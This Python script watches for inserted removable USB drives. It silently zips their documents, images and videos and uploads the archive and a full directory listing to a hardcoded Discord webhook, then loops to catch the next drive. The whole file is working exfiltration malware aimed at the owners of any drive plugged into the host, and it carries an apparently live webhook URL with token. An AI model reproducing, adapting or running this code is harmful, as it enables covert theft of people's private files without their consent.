from zipfile import ZipFile, ZIP_DEFLATED
from rich.console import Console
from datetime import datetime
from rich.tree import Tree
from io import StringIO
from rich import print
import psutil as ps
import requests
import tempfile
import time
import os

URL: str = "https://discord.com/api/webhooks/1464360790571094027/X9kN7viRzmX_iq3KVLJeKx6zEAI5ur-YYk5QnX2tSCh-ZTLGI3sm5KtaKVSRrzpLGuFb"
allowed_extension = (".docx", ".doc", ".ppt", ".pptx", ".pdf", ".txt", ".jpg", ".png", ".mp4")

zip_temp_dir = os.path.join(tempfile.gettempdir(), "zipped_files.zip")

def build_tree(path: str, tree: Tree):
    try:
        entries = sorted(os.listdir(path))
    except PermissionError:
        tree.add("Permission denied")
        return

    for entry in entries:
        full_path = os.path.join(path, entry)

        if os.path.isdir(full_path):
            branch = tree.add(f"📁 {entry}")
            build_tree(full_path, branch)
        else:
            try:
                size_mb = os.path.getsize(full_path) / (1024 * 1024)
                tree.add(f"📄 {entry} ({size_mb:.1f} MB)")
            except OSError:
                tree.add(f"📄 {entry} (size unavailable)")
def render_tree(tree) -> str:
    buffer = StringIO()
    console = Console(file=buffer, force_terminal=True, width=100)
    console.print(tree)
    return buffer.getvalue()
def datetime_log():
    local_time = datetime.now()

    weekday: str = local_time.strftime("%A")
    time_log: str = local_time.strftime("%X")
    date: str = local_time.strftime("%x")

    formatted_date = (f"{weekday} | {time_log} | {date}")
    return formatted_date

root_path = "/path/to/root"

def main() -> None:

    def detect_usb() -> bool:
        for partition in ps.disk_partitions():
            if "removable" in partition.opts.lower():
                global root_path
                root_path = partition.mountpoint
                
                message = { "content": f"**USB detected!**\n{datetime_log()}" }

                response = requests.post(URL, json=message)
                print(f"Detection request: {response.status_code}")
                print("USB detected!")
                return True

    while True:
        time.sleep(2)
        print("Detecting USB...", end="\r")
        if detect_usb():
            try:
                with ZipFile(zip_temp_dir, "w", ZIP_DEFLATED) as zipfile:

                    for root, dirs, files in os.walk(root_path):
                        for file in files:
                            file_path = os.path.join(root, file)

                            if os.path.isfile(file_path):
                                _, extension = os.path.splitext(file)
                                size_bytes = os.path.getsize(file_path)

                                size_mb = size_bytes / (1024 * 1024)

                                if extension.lower() in allowed_extension and size_mb < 50:
                                    print(f"File {size_mb:.1f} MB: {os.path.basename(file_path)}")
                                    zipfile.write(file_path)

                tree = Tree(f"📁 {root_path}")
                build_tree(root_path, tree)
            except Exception as error_os:
                print(f"There was an error: {error_os}")
            break

    try:
        with open(zip_temp_dir, "rb") as zip_file:
            files = { "file": zip_file }
            response = requests.post(URL, files=files)

            print(f"Zip file post request: {response.status_code}")
            time.sleep(1)
    except Exception as zipfile_error:
        print(f"There was an error: {zipfile_error}")
        
    formatted_tree_message = render_tree(tree)
    tree_temp_dir = os.path.join(tempfile.gettempdir(), "tree_temp_file.txt")

    try:
        with open(tree_temp_dir, "w", encoding="utf-8") as tree_file:
            tree_file.write(formatted_tree_message)
            time.sleep(1)
    except Exception as tree_render_error:
        print(f"There was an error: {tree_render_error}")

    try:
        with open(tree_temp_dir, "rb") as tree_file:
            files = { "file": tree_file }
            response = requests.post(URL, files=files)
    except Exception as tree_post_error:
        print(f"There was an error: {tree_post_error}")

    print(f"Tree file post request: {response.status_code}")
    time.sleep(1)
    os.remove(tree_temp_dir)

    time.sleep(15)
    main()

if __name__ == "__main__":
    main()